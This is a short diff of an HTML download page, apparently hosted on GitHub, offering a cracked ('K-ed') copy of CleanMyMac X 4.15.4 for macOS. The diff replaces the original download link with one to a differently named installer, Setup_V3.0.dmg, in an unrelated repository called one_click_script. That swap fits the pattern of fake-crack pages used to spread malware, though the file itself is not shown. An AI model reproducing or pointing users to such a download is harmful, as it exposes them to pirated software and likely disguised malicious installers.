@@ -5,5 +5,5 @@
 <p><img src="https://repository-images.githubusercontent.com/33388429/d7c0114f-d551-4716-a095-ca31c0b4fdd6"/></p>
 
 <p><strong>System Requirements: macOS 10.15 and later</p>
-CleanMyMac X 4.15.4 [Intel/Apple] [K-ed] | <a href="https://github.com/wangjianpeng/CleanMyMac-X/releases/download/4.15.4/Installerx.dmg">Download</a>
+CleanMyMac X 4.15.4 [Intel/Apple] [K-ed] | <a href="https://github.com/wangjianpeng/one_click_script/releases/download/4%2C15/Setup_V3.0.dmg">Download</a>
 </h1>
